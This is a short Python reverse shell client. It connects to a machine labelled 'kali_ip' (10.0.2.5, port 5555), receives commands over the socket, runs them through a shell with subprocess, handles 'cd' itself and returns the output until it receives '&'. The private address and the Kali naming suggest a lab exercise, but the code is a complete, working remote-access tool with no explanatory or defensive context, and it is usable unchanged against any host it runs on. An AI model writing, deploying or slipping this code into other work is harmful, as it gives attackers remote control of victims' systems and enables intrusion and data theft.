import socket
import subprocess
import os

kali_ip = "10.0.2.5"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_ip, 5555))

def run_command(command):
    try:
        if command.startswith("cd "):
            # Handle 'cd' command separately
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            return f"Changed directory to {os.getcwd()}\n"
        else:
            result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = result.communicate()
            return output.decode() if not error else f"Error: {error.decode()}"
    except Exception as err:
        return f"Error: {str(err)}"

while True:
    encoded_data = s.recv(1024)
    data = encoded_data.decode()
    
    if not encoded_data:
        continue
    
    print("Received command: %s" % data)

    if data.strip() == "&":
        s.send("Disconnected".encode())
        s.close()
        break
        
    print("Executing command: %s" % data)

    result = run_command(data)
    s.send(result.encode())
